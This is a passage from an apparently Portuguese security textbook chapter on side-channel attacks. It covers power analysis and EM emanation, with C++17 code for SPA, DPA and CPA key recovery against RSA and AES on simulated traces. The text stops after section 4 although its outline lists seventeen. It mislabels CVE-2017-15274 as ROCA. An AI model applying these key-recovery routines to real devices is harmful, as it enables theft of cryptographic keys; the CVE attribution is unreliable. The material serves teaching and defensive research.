# Capítulo 03 — Ataques de Canal Lateral Avançados

> *"O computador mais vulneravel e aquele que voce acha que ja protegeu o suficiente."*

---

## Sumario

1. [Objetivos de Aprendizado](#1-objetivos-de-aprendizado)
2. [Taxonomia de Side-Channel Attacks](#2-taxonomia-de-side-channel-attacks)
3. [Power Analysis](#3-power-analysis)
4. [Electromagnetic (EM) Emanation](#4-electromagnetic-em-emanation)
5. [Cache-Based Attacks](#5-cache-based-attacks)
6. [Branch Prediction Attacks](#6-branch-prediction-attacks)
7. [Microarchitectural Data Sampling (MDS)](#7-microarchitectural-data-sampling-mds)
8. [Speculative Execution](#8-speculative-execution)
9. [Frequency/Power Attacks](#9-frequencypower-attacks)
10. [Data Sampling Attacks](#10-data-sampling-attacks)
11. [Fault Injection Attacks](#11-fault-injection-attacks)
12. [CVE Deep Dives com Exemplos de Codigo](#12-cve-deep-dives-com-exemplos-de-codigo)
13. [Mitigation Strategies](#13-mitigation-strategies)
14. [Countermeasure Implementation in C++17](#14-countermeasure-implementation-in-c17)
15. [Hardware Requirements for Side-Channel Research](#15-hardware-requirements-for-side-channel-research)
16. [Exercises](#16-exercises)
17. [References](#17-references)

---

## 1. Objetivos de Aprendizado

Ao final deste capitulo, voce sera capaz de:

- Classificar ataques de canal lateral conforme sua taxonomia (passivo vs. ativo, local vs. remoto)
- Implementar e analisar ataques de power analysis (SPA, DPA, CPA) em C++17
- Compreender mecanismos de ataques baseados em cache (Prime+Probe, Flush+Reload, Evict+Time)
- Analisar variaveis do Spectre (V1, V2, BHB) e seus mitigations
- Compreender MDS/ZombieLoad, Fallout e CacheOut/L1DES
- Implementar mitigations em C++17 para ataques de canal lateral
- Analisar CVEs reais: CVE-2017-15274 (ROCA), CVE-2019-11091 (MDS), Spectre-BHB
- Compreender ataques de fault injection: voltage glitching, laser, Rowhammer
- Projetar contramedidas em nivel de software e hardware

**Prerequisitos:** Capitulos anteriores desta serie, conhecimento basico de arquitetura de computadores, C++17, e criptografia.

---

## 2. Taxonomia de Side-Channel Attacks

Um ataque de canal lateral explora informacoes fisicas observaveis durante a execucao de um sistema criptografico, sem vulnerar a primitiva criptografica em si. A diferenca fundamental entre um ataque convencional e um ataque de canal lateral e que este ultimo nao ataca o algoritmo, mas sim sua implementacao fisica.

### 2.1 Classificacao por Origem da Informacao

```
+------------------------------------------+
|        Canal Lateral (Side-Channel)       |
+------------------------------------------+
|                                           |
|  Passivo                  Ativo           |
|  (observa)                (manipula)      |
|                                           |
|  +-----------------+    +---------------+ |
|  | Power Analysis  |    | Fault Inject  | |
|  | EM Emanation    |    | Clock Glitch  | |
|  | Cache Timing    |    | Rowhammer     | |
|  | Branch Pred.    |    | Voltage Manip | |
|  | Acoustic        |    | Laser Fault   | |
|  | Thermal         |    |               | |
|  +-----------------+    +---------------+ |
+------------------------------------------+
```

### 2.2 Classificacao por Distancia

| Distancia | Exemplos | Vetor |
|-----------|----------|-------|
| Local (on-chip) | Prime+Probe, Flush+Reload, MDS, Spectre | Intra-processo, co-locação em cloud |
| Local (board-level) | Power analysis, EM emanation, fault injection | Acesso fisico ao hardware |
| Remoto (cross-host) | Spectre-BHB, network timing, cache coherency | Cross-VM, cross-tenant |

### 2.3 Classificacao por Informacao Exposta

| Categoria | Canais | Exemplo |
|-----------|--------|---------|
| Secret-dependent branches | Branch prediction, cache | Spectre V1 |
| Secret-dependent memory access | Cache timing | Prime+Probe |
| Secret-dependent power consumption | Power traces | DPA/CPA |
| Secret-dependent EM emanation | EM probes | Near-field EM |
| Secret-dependent timing | Execution time | Flush+Reload |
| Microarchitectural state leakage | SMT, MDS | ZombieLoad |

### 2.4 Matriz de Ameaca

```
                     +-----------------------------------------+
                     |           GRAVIDADE DO IMPACTO          |
                     +-----------------------------------------+
                     |  Baixa    |  Media   |  Alta   | Critica|
+--------------------+----------+----------+---------+--------+
| Facilidade de      | Low      | Med      | High    | Critical|
| Exploracao         |          |          |         |         |
+--------------------+----------+----------+---------+--------+
| Acesso Necessario  | Remoto   | Red      | Local   | Phys    |
+--------------------+----------+----------+---------+--------+
| Informacoes        | Tempo    | Cache    | Chave   | Toda    |
| Obtidas            | de exec. | lines    | parcial | chave   |
+--------------------+----------+----------+---------+--------+
```

### 2.5 O Modelo do Adversario

Em criptografia de canais laterais, o modelo do adversario define:

1. **Capacidades de observacao:** O que o adversario pode medir (traces de potencia, tempo de cache, tempo de execucao)
2. **Capacidades de controle:** O que o adversario pode influenciar (entradas do algoritmo, layout de memoria, agendamento de processos)
3. **Modelo de conhecimento:** White-box (conhece o algoritmo), grey-box (conhece parcialmente a implementacao), black-box (so observa entradas/saidas)
4. **Custo e limitacoes:** Orçamento, acesso fisico, tempo de coleta

---

## 3. Power Analysis

Power analysis e uma das tecnicas de canal lateral mais poderosas e estudadas. A premissa e simples: circuits integrados consomem diferentes quantidades de energia dependendo das operacoes que executam e dos dados que processam.

### 3.1 Fundamentos do Power Consumption

O consumo de energia em um circuito CMOS e composto por:

```
P_total = P_static + P_dynamic

P_dynamic = alpha * C_L * V_dd^2 * f

Onde:
  alpha    = fator de atividade (probabilidade de transicao 0->1)
  C_L      = capacitancia de carga
  V_dd     = tensao de alimentacao
  f        = frequencia de clock
```

O fator de atividade `alpha` depende dos dados processados, o que cria o canal lateral de power analysis.

### 3.2 Simple Power Analysis (SPA)

SPA envolve a inspecao visual direta de uma trace de potencia. Operacoes diferentes (multiplicacao vs. squaring em RSA, por exemplo) produzem padroes de consumo distintos.

```cpp
// spa_analysis.cpp - Analise basica de traces de potencia
#include <vector>
#include <numeric>
#include <cmath>
#include <fstream>
#include <iostream>
#include <algorithm>

struct PowerSample {
    double timestamp;
    double power;
};

class SPAPowerAnalyzer {
public:
    explicit SPAPowerAnalyzer(const std::vector<PowerSample>& trace)
        : trace_(trace) {}

    std::vector<double> extractPeaks(double threshold) const {
        std::vector<double> peaks;
        if (trace_.size() < 3) return peaks;

        for (size_t i = 1; i + 1 < trace_.size(); ++i) {
            double prev = trace_[i - 1].power;
            double curr = trace_[i].power;
            double next = trace_[i + 1].power;

            if (curr > prev && curr > next && curr > threshold) {
                peaks.push_back(trace_[i].timestamp);
            }
        }
        return peaks;
    }

    std::vector<double> computeDifferences(const std::vector<double>& peaks) const {
        std::vector<double> diffs;
        for (size_t i = 1; i < peaks.size(); ++i) {
            diffs.push_back(peaks[i] - peaks[i - 1]);
        }
        return diffs;
    }

    double computeMeanPower() const {
        double sum = 0.0;
        for (const auto& sample : trace_) {
            sum += sample.power;
        }
        return sum / static_cast<double>(trace_.size());
    }

    double computeVariance() const {
        double mean = computeMeanPower();
        double sum_sq = 0.0;
        for (const auto& sample : trace_) {
            double diff = sample.power - mean;
            sum_sq += diff * diff;
        }
        return sum_sq / static_cast<double>(trace_.size());
    }

    void printStatistics() const {
        std::cout << "=== SPA Statistics ===" << std::endl;
        std::cout << "Samples: " << trace_.size() << std::endl;
        std::cout << "Mean power: " << computeMeanPower() << std::endl;
        std::cout << "Variance: " << computeVariance() << std::endl;

        double min_p = trace_.empty() ? 0.0 : trace_[0].power;
        double max_p = min_p;
        for (const auto& s : trace_) {
            min_p = std::min(min_p, s.power);
            max_p = std::max(max_p, s.power);
        }
        std::cout << "Range: [" << min_p << ", " << max_p << "]" << std::endl;
    }

private:
    const std::vector<PowerSample>& trace_;
};

class SPAKeyRecovery {
public:
    static std::vector<int> analyzeRSAMultiplications(
        const std::vector<double>& peaks)
    {
        std::vector<int> keyBits;
        if (peaks.size() < 2) return keyBits;

        std::vector<double> intervals;
        for (size_t i = 1; i < peaks.size(); ++i) {
            intervals.push_back(peaks[i] - peaks[i - 1]);
        }

        double median = computeMedian(intervals);

        for (double interval : intervals) {
            if (interval < median * 0.75) {
                keyBits.push_back(0);
            } else {
                keyBits.push_back(1);
            }
        }
        return keyBits;
    }

private:
    static double computeMedian(std::vector<double> values) {
        std::sort(values.begin(), values.end());
        size_t n = values.size();
        if (n == 0) return 0.0;
        if (n % 2 == 0) {
            return (values[n / 2 - 1] + values[n / 2]) / 2.0;
        }
        return values[n / 2];
    }
};
```

### 3.3 Differential Power Analysis (DPA)

DPA usa analise estatistica sobre multiplas traces para extrair bits da chave. O principio fundamental e correlacionar o consumo de potencia com uma hipotese sobre partes da chave.

```cpp
// dpa_attack.cpp - Implementacao de DPA
#include <vector>
#include <array>
#include <cmath>
#include <cstdint>
#include <numeric>
#include <algorithm>
#include <iostream>

class DPAAttacker {
public:
    static constexpr size_t NUM_SAMPLES = 1000;
    static constexpr size_t KEY_GUESS_SPACE = 256;

    struct DPAResult {
        uint8_t keyByte;
        double correlation;
    };

    std::vector<DPAResult> recoverKeyByte(
        const std::vector<std::vector<double>>& powerTraces,
        const std::vector<uint8_t>& knownPlaintexts)
    {
        size_t numTraces = powerTraces.size();
        size_t traceLength = powerTraces[0].size();
        std::vector<DPAResult> results;

        for (uint16_t keyGuess = 0; keyGuess < KEY_GUESS_SPACE; ++keyGuess) {
            std::vector<double> hypothesis(numTraces);

            for (size_t t = 0; t < numTraces; ++t) {
                hypothesis[t] = static_cast<double>(
                    hammingWeight(knownPlaintexts[t] ^ static_cast<uint8_t>(keyGuess))
                );
            }

            double bestCorrelation = 0.0;
            size_t bestSample = 0;

            for (size_t s = 0; s < traceLength; ++s) {
                std::vector<double> measurements(numTraces);
                for (size_t t = 0; t < numTraces; ++t) {
                    measurements[t] = powerTraces[t][s];
                }

                double corr = computeCorrelation(hypothesis, measurements);
                if (std::abs(corr) > std::abs(bestCorrelation)) {
                    bestCorrelation = corr;
                    bestSample = s;
                }
            }

            results.push_back({
                static_cast<uint8_t>(keyGuess),
                bestCorrelation
            });
        }

        std::sort(results.begin(), results.end(),
            [](const DPAResult& a, const DPAResult& b) {
                return std::abs(a.correlation) > std::abs(b.correlation);
            });

        return results;
    }

    uint8_t extractMostLikelyByte(
        const std::vector<DPAResult>& results)
    {
        if (results.empty()) return 0;
        return results[0].keyByte;
    }

    void printTopCandidates(
        const std::vector<DPAResult>& results,
        size_t topN = 5)
    {
        std::cout << "Top " << topN << " key byte candidates:" << std::endl;
        for (size_t i = 0; i < std::min(topN, results.size()); ++i) {
            printf("  Candidate 0x%02X: correlation = %.6f\n",
                   results[i].keyByte, results[i].correlation);
        }
    }

private:
    static int hammingWeight(uint8_t value) {
        int count = 0;
        while (value) {
            count += value & 1;
            value >>= 1;
        }
        return count;
    }

    static double computeCorrelation(
        const std::vector<double>& x,
        const std::vector<double>& y)
    {
        size_t n = x.size();
        if (n != y.size() || n == 0) return 0.0;

        double sumX = 0.0, sumY = 0.0;
        double sumXY = 0.0, sumX2 = 0.0, sumY2 = 0.0;

        for (size_t i = 0; i < n; ++i) {
            sumX += x[i];
            sumY += y[i];
            sumXY += x[i] * y[i];
            sumX2 += x[i] * x[i];
            sumY2 += y[i] * y[i];
        }

        double numerator = n * sumXY - sumX * sumY;
        double denominator = std::sqrt(
            (n * sumX2 - sumX * sumX) * (n * sumY2 - sumY * sumY)
        );

        if (denominator == 0.0) return 0.0;
        return numerator / denominator;
    }
};
```

### 3.4 Correlation Power Analysis (CPA)

CPA e uma extensao formal de DPA que usa correlacao de Pearson para medir a relacao entre hipoteses de chave e traces de potencia.

```cpp
// cpa_attack.cpp - Correlation Power Analysis
#include <vector>
#include <cmath>
#include <cstdint>
#include <algorithm>
#include <iostream>
#include <numeric>

class CPAAttacker {
public:
    struct CPAKeyCandidate {
        uint8_t byte;
        double maxCorrelation;
        size_t sampleIndex;
    };

    struct KeyHypothesis {
        std::vector<double> values;
    };

    std::vector<CPAKeyCandidate> attack(
        const std::vector<std::vector<double>>& traces,
        const std::vector<std::array<uint8_t, 16>>& plaintexts,
        size_t keyByteIndex)
    {
        size_t numTraces = traces.size();
        size_t traceLen = traces[0].size();

        std::vector<CPAKeyCandidate> candidates;

        for (int guess = 0; guess < 256; ++guess) {
            KeyHypothesis hyp = computeSBoxOutput(plaintexts, guess, keyByteIndex);

            std::vector<double> hypVals(numTraces);
            for (size_t t = 0; t < numTraces; ++t) {
                hypVals[t] = static_cast<double>(hyp.values[t]);
            }

            double maxCorr = 0.0;
            size_t maxSample = 0;

            for (size_t s = 0; s < traceLen; ++s) {
                std::vector<double> traceVals(numTraces);
                for (size_t t = 0; t < numTraces; ++t) {
                    traceVals[t] = traces[t][s];
                }

                double corr = pearsonCorrelation(hypVals, traceVals);
                if (std::abs(corr) > std::abs(maxCorr)) {
                    maxCorr = corr;
                    maxSample = s;
                }
            }

            candidates.push_back({
                static_cast<uint8_t>(guess),
                maxCorr,
                maxSample
            });
        }

        std::sort(candidates.begin(), candidates.end(),
            [](const CPAKeyCandidate& a, const CPAKeyCandidate& b) {
                return std::abs(a.maxCorrelation) > std::abs(b.maxCorrelation);
            });

        return candidates;
    }

    std::vector<uint8_t> recoverFullKey(
        const std::vector<std::vector<double>>& traces,
        const std::vector<std::array<uint8_t, 16>>& plaintexts,
        size_t keyLength)
    {
        std::vector<uint8_t> recoveredKey(keyLength);

        for (size_t k = 0; k < keyLength; ++k) {
            auto candidates = attack(traces, plaintexts, k);
            recoveredKey[k] = candidates[0].byte;

            std::cout << "Key byte " << k
                      << ": 0x" << std::hex << static_cast<int>(candidates[0].byte)
                      << " (r=" << std::dec << candidates[0].maxCorrelation
                      << ")" << std::endl;
        }

        return recoveredKey;
    }

private:
    static KeyHypothesis computeSBoxOutput(
        const std::vector<std::array<uint8_t, 16>>& plaintexts,
        int keyGuess,
        size_t byteIndex)
    {
        static const uint8_t AES_SBOX[256] = {
            0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5,
            0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
            0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0,
            0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
            0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC,
            0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
            0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A,
            0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
            0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0,
            0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
            0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B,
            0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
            0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85,
            0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
            0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5,
            0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
            0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17,
            0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
            0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88,
            0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
            0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C,
            0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
            0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9,
            0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
            0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6,
            0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
            0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E,
            0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
            0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94,
            0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
            0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68,
            0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16
        };

        KeyHypothesis hyp;
        hyp.values.resize(plaintexts.size());

        for (size_t t = 0; t < plaintexts.size(); ++t) {
            uint8_t input = plaintexts[t][byteIndex] ^ static_cast<uint8_t>(keyGuess);
            hyp.values[t] = static_cast<double>(AES_SBOX[input]);
        }

        return hyp;
    }

    static double pearsonCorrelation(
        const std::vector<double>& x,
        const std::vector<double>& y)
    {
        size_t n = x.size();
        if (n == 0) return 0.0;

        double meanX = std::accumulate(x.begin(), x.end(), 0.0) / n;
        double meanY = std::accumulate(y.begin(), y.end(), 0.0) / n;

        double covXY = 0.0, varX = 0.0, varY = 0.0;
        for (size_t i = 0; i < n; ++i) {
            double dx = x[i] - meanX;
            double dy = y[i] - meanY;
            covXY += dx * dy;
            varX += dx * dx;
            varY += dy * dy;
        }

        double denom = std::sqrt(varX * varY);
        if (denom == 0.0) return 0.0;
        return covXY / denom;
    }
};
```

### 3.5 Ferramentas de Power Analysis

| Ferramenta | Tipo | Plataforma | Uso Principal |
|-----------|------|------------|---------------|
| ChipWhisperer | Hardware+Software | Open Source | Coleta e analise de traces |
| ELMO | Software | Open Source | Analise automatizada |
| Riscure Inspector | Comercial | Proprietario | Analise profissional |
| Power Analyzer Keysight | Hardware | Comercial | Medicao precisa |
| SAKURA-G | Hardware | Academico | AES em FPGA |

### 3.6 Exemplo: Coleta de Traces com ChipWhisperer

```cpp
// chipwhisperer_interface.cpp - Interface para coleta de traces
#include <vector>
#include <array>
#include <cstdint>
#include <iostream>
#include <fstream>
#include <random>
#include <cstring>

struct TraceConfig {
    size_t numTraces;
    size_t samplesPerTrace;
    double sampleRateMHz;
    uint32_t triggerDelay;
    uint32_t numSegments;
};

class ChipWhispererInterface {
public:
    explicit ChipWhispererInterface(const TraceConfig& config)
        : config_(config)
        , rng_(std::random_device{}())
        , dist_(0, 255)
    {}

    std::pair<std::vector<std::array<uint8_t, 16>>,
              std::vector<std::vector<double>>>
    captureTraces(const std::array<uint8_t, 16>& key)
    {
        std::cout << "Configuring capture..." << std::endl;
        std::cout << "  Traces: " << config_.numTraces << std::endl;
        std::cout << "  Samples per trace: "
                  << config_.samplesPerTrace << std::endl;
        std::cout << "  Sample rate: "
                  << config_.sampleRateMHz << " MHz" << std::endl;

        std::vector<std::array<uint8_t, 16>> plaintexts(config_.numTraces);
        std::vector<std::vector<double>> traces(config_.numTraces);

        for (size_t i = 0; i < config_.numTraces; ++i) {
            for (size_t j = 0; j < 16; ++j) {
                plaintexts[i][j] = dist_(rng_);
            }

            traces[i] = simulatePowerTrace(plaintexts[i], key);

            if (i % 100 == 0) {
                std::cout << "  Captured " << i << "/"
                          << config_.numTraces << " traces" << std::endl;
            }
        }

        std::cout << "Capture complete." << std::endl;
        return {plaintexts, traces};
    }

    bool saveTraces(
        const std::string& filename,
        const std::vector<std::vector<double>>& traces)
    {
        std::ofstream out(filename, std::ios::binary);
        if (!out) return false;

        uint32_t numTraces = static_cast<uint32_t>(traces.size());
        uint32_t samplesPerTrace = static_cast<uint32_t>(
            traces.empty() ? 0 : traces[0].size());

        out.write(reinterpret_cast<const char*>(&numTraces), sizeof(uint32_t));
        out.write(reinterpret_cast<const char*>(&samplesPerTrace), sizeof(uint32_t));

        for (const auto& trace : traces) {
            for (double sample : trace) {
                float f = static_cast<float>(sample);
                out.write(reinterpret_cast<const char*>(&f), sizeof(float));
            }
        }
        return true;
    }

    std::vector<std::vector<double>> loadTraces(const std::string& filename) {
        std::ifstream in(filename, std::ios::binary);
        if (!in) return {};

        uint32_t numTraces, samplesPerTrace;
        in.read(reinterpret_cast<char*>(&numTraces), sizeof(uint32_t));
        in.read(reinterpret_cast<char*>(&samplesPerTrace), sizeof(uint32_t));

        std::vector<std::vector<double>> traces(
            numTraces, std::vector<double>(samplesPerTrace));

        for (size_t i = 0; i < numTraces; ++i) {
            for (size_t j = 0; j < samplesPerTrace; ++j) {
                float f;
                in.read(reinterpret_cast<char*>(&f), sizeof(float));
                traces[i][j] = static_cast<double>(f);
            }
        }
        return traces;
    }

private:
    TraceConfig config_;
    std::mt19937 rng_;
    std::uniform_int_distribution<int> dist_;

    std::vector<double> simulatePowerTrace(
        const std::array<uint8_t, 16>& plaintext,
        const std::array<uint8_t, 16>& key)
    {
        static const uint8_t SBOX[256] = {
            0x63,0x7C,0x77,0x7B,0xF2,0x6B,0x6F,0xC5,
            0x30,0x01,0x67,0x2B,0xFE,0xD7,0xAB,0x76,
            0xCA,0x82,0xC9,0x7D,0xFA,0x59,0x47,0xF0,
            0xAD,0xD4,0xA2,0xAF,0x9C,0xA4,0x72,0xC0,
            0xB7,0xFD,0x93,0x26,0x36,0x3F,0xF7,0xCC,
            0x34,0xA5,0xE5,0xF1,0x71,0xD8,0x31,0x15,
            0x04,0xC7,0x23,0xC3,0x18,0x96,0x05,0x9A,
            0x07,0x12,0x80,0xE2,0xEB,0x27,0xB2,0x75,
            0x09,0x83,0x2C,0x1A,0x1B,0x6E,0x5A,0xA0,
            0x52,0x3B,0xD6,0xB3,0x29,0xE3,0x2F,0x84,
            0x53,0xD1,0x00,0xED,0x20,0xFC,0xB1,0x5B,
            0x6A,0xCB,0xBE,0x39,0x4A,0x4C,0x58,0xCF,
            0xD0,0xEF,0xAA,0xFB,0x43,0x4D,0x33,0x85,
            0x45,0xF9,0x02,0x7F,0x50,0x3C,0x9F,0xA8,
            0x51,0xA3,0x40,0x8F,0x92,0x9D,0x38,0xF5,
            0xBC,0xB6,0xDA,0x21,0x10,0xFF,0xF3,0xD2,
            0xCD,0x0C,0x13,0xEC,0x5F,0x97,0x44,0x17,
            0xC4,0xA7,0x7E,0x3D,0x64,0x5D,0x19,0x73,
            0x60,0x81,0x4F,0xDC,0x22,0x2A,0x90,0x88,
            0x46,0xEE,0xB8,0x14,0xDE,0x5E,0x0B,0xDB,
            0xE0,0x32,0x3A,0x0A,0x49,0x06,0x24,0x5C,
            0xC2,0xD3,0xAC,0x62,0x91,0x95,0xE4,0x79,
            0xE7,0xC8,0x37,0x6D,0x8D,0xD5,0x4E,0xA9,
            0x6C,0x56,0xF4,0xEA,0x65,0x7A,0xAE,0x08,
            0xBA,0x78,0x25,0x2E,0x1C,0xA6,0xB4,0xC6,
            0xE8,0xDD,0x74,0x1F,0x4B,0xBD,0x8B,0x8A,
            0x70,0x3E,0xB5,0x66,0x48,0x03,0xF6,0x0E,
            0x61,0x35,0x57,0xB9,0x86,0xC1,0x1D,0x9E,
            0xE1,0xF8,0x98,0x11,0x69,0xD9,0x8E,0x94,
            0x9B,0x1E,0x87,0xE9,0xCE,0x55,0x28,0xDF,
            0x8C,0xA1,0x89,0x0D,0xBF,0xE6,0x42,0x68,
            0x41,0x99,0x2D,0x0F,0xB0,0x54,0xBB,0x16
        };

        std::vector<double> trace(config_.samplesPerTrace, 0.0);
        std::mt19937 traceRng(42);
        std::normal_distribution<double> noise(0.0, 0.5);

        for (size_t round = 0; round < 10; ++round) {
            size_t baseIdx = round * (config_.samplesPerTrace / 10);

            for (size_t b = 0; b < 16; ++b) {
                uint8_t sbox_out = SBOX[plaintext[b] ^ key[b]];
                int hw = 0;
                uint8_t tmp = sbox_out;
                while (tmp) { hw += tmp & 1; tmp >>= 1; }

                size_t sampleIdx = baseIdx + b * 4;
                if (sampleIdx < config_.samplesPerTrace) {
                    trace[sampleIdx] += static_cast<double>(hw) * 3.7;
                }
            }
        }

        for (size_t i = 0; i < config_.samplesPerTrace; ++i) {
            trace[i] += noise(traceRng);
        }

        return trace;
    }
};
```


---

## 4. Electromagnetic (EM) Emanation

Ataques de emanacao eletromagnetica captam os campos eletromagneticos emitidos por circuitos integrados durante a execucao. Essa tecnica oferece vantagens significativas sobre power analysis em certos cenarios.

### 4.1 Principios Fisicos

Todo circuito eletrico emite radiacao eletromagnetica. A intensidade do campo magnetico gerado por um condutor e dada pela Lei de Biot-Savart:

```
dB = (mu_0 / 4*pi) * (I * dl x r) / r^3

Onde:
  mu_0 = permissividade magnetica do vacuo (4*pi*10^-7 T.m/A)
  I    = corrente no condutor
  dl   = elemento diferencial de comprimento
  r    = vetor posicao ate o ponto de observacao
```

Em circuitos CMOS, a corrente varia com as transicoes de logica, criando um canal de informacao eletromagnetico.

### 4.2 Near-Field EM Probes

Probes de campo proximo sao sensores pequenos que captam campos eletromagneticos em distancias muito proximas (micrometros a milimetros) do chip alvo.

```
+-----------------------------------+
|       Setor de Near-Field EM      |
+-----------------------------------+
|                                   |
|  +---+   +---+   +---+           |
|  |PROBE->|CHIP|   |ADC|           |
|  +---+   +---+   +---+           |
|    |                |             |
|    +----> Coleta <---+            |
|                                   |
|  Resolucao: ~1mm                  |
|  Frequencia: DC - 6 GHz          |
|  Sensibilidade: ~nV/sqrt(Hz)     |
+-----------------------------------+
```

```cpp
// em_analysis.cpp - Analise de emanacao eletromagnetica
#include <vector>
#include <complex>
#include <cmath>
#include <algorithm>
#include <iostream>
#include <numeric>

using Complex = std::complex<double>;

class EMProbeAnalyzer {
public:
    struct EMConfig {
        double sampleRateHz;
        double centerFreqHz;
        double bandwidthHz;
        size_t numPoints;
    };

    explicit EMProbeAnalyzer(const EMConfig& config)
        : config_(config)
        , fftSize_(nextPowerOf2(config_.numPoints))
    {}

    std::vector<std::vector<double>> performSpectrogram(
        const std::vector<double>& signal,
        size_t windowSize,
        size_t hopSize)
    {
        std::vector<std::vector<double>> spectrogram;
        size_t numWindows = (signal.size() - windowSize) / hopSize + 1;

        for (size_t w = 0; w < numWindows; ++w) {
            std::vector<double> window(windowSize);
            for (size_t i = 0; i < windowSize; ++i) {
                window[i] = signal[w * hopSize + i] * hannWindow(i, windowSize);
            }

            auto spectrum = computeFFT(window);
            std::vector<double> magnitudes(spectrum.size());
            for (size_t i = 0; i < spectrum.size(); ++i) {
                magnitudes[i] = std::abs(spectrum[i]);
            }
            spectrogram.push_back(magnitudes);
        }

        return spectrogram;
    }

    std::vector<double> computeBandPower(
        const std::vector<double>& signal,
        double lowFreq,
        double highFreq)
    {
        auto spectrum = computeFFT(signal);
        std::vector<double> power;
        double freqResolution = config_.sampleRateHz / static_cast<double>(spectrum.size());

        for (size_t i = 0; i < spectrum.size(); ++i) {
            double freq = i * freqResolution;
            if (freq >= lowFreq && freq <= highFreq) {
                double mag = std::abs(spectrum[i]);
                power.push_back(mag * mag);
            }
        }

        return power;
    }

    std::vector<Complex> computeDFT(const std::vector<double>& signal) {
        size_t N = signal.size();
        std::vector<Complex> result(N);

        for (size_t k = 0; k < N; ++k) {
            Complex sum(0.0, 0.0);
            for (size_t n = 0; n < N; ++n) {
                double angle = -2.0 * M_PI * static_cast<double>(k * n)
                             / static_cast<double>(N);
                sum += Complex(signal[n] * std::cos(angle),
                              signal[n] * std::sin(angle));
            }
            result[k] = sum;
        }
        return result;
    }

    std::vector<double> computeCrossCorrelation(
        const std::vector<double>& a,
        const std::vector<double>& b)
    {
        size_t N = a.size();
        std::vector<double> xcorr(N);

        for (size_t lag = 0; lag < N; ++lag) {
            double sum = 0.0;
            for (size_t i = 0; i + lag < N; ++i) {
                sum += a[i] * b[i + lag];
            }
            xcorr[lag] = sum / static_cast<double>(N - lag);
        }

        return xcorr;
    }

    std::vector<double> computePSD(const std::vector<double>& signal) {
        auto spectrum = computeFFT(signal);
        std::vector<double> psd(spectrum.size());

        for (size_t i = 0; i < spectrum.size(); ++i) {
            psd[i] = std::norm(spectrum[i])
                    / static_cast<double>(spectrum.size());
        }
        return psd;
    }

private:
    EMConfig config_;
    size_t fftSize_;

    static size_t nextPowerOf2(size_t n) {
        size_t power = 1;
        while (power < n) power <<= 1;
        return power;
    }

    static double hannWindow(size_t n, size_t N) {
        return 0.5 * (1.0 - std::cos(2.0 * M_PI * n / (N - 1)));
    }

    std::vector<Complex> computeFFT(const std::vector<double>& signal) {
        size_t N = nextPowerOf2(signal.size());
        std::vector<Complex> x(N);

        for (size_t i = 0; i < signal.size(); ++i) {
            x[i] = Complex(signal[i], 0.0);
        }

        bitReversePermutation(x);
        fftRecursive(x);

        return x;
    }

    void bitReversePermutation(std::vector<Complex>& x) {
        size_t N = x.size();
        for (size_t i = 1, j = 0; i < N; ++i) {
            size_t bit = N >> 1;
            while (j & bit) {
                j ^= bit;
                bit >>= 1;
            }
            j ^= bit;
            if (i < j) {
                std::swap(x[i], x[j]);
            }
        }
    }

    void fftRecursive(std::vector<Complex>& x) {
        size_t N = x.size();
        if (N <= 1) return;

        for (size_t len = 2; len <= N; len <<= 1) {
            double angle = -2.0 * M_PI / static_cast<double>(len);
            Complex wn(std::cos(angle), std::sin(angle));

            for (size_t i = 0; i < N; i += len) {
                Complex w(1.0, 0.0);
                for (size_t j = 0; j < len / 2; ++j) {
                    Complex u = x[i + j];
                    Complex v = x[i + j + len / 2] * w;
                    x[i + j] = u + v;
                    x[i + j + len / 2] = u - v;
                    w *= wn;
                }
            }
        }
    }
};
```

### 4.3 Comparacao: Power Analysis vs. EM Emanation

| Aspecto | Power Analysis | EM Emanation |
|---------|---------------|--------------|
| Sondagem espacial | Baixa (mede consumo global) | Alta (pode isolar blocos) |
| Resolucao | Por operacao | Por registrador/logica |
| Acesso ao hardware | Requer shunt/sonda | Sonda de campo proximo |
| Complexidade | Menor | Maior |
| Ruido ambiental | Mais sensivel | Mais robusto |
| Custo da sonda | US$ 5-50 | US$ 50-500 |
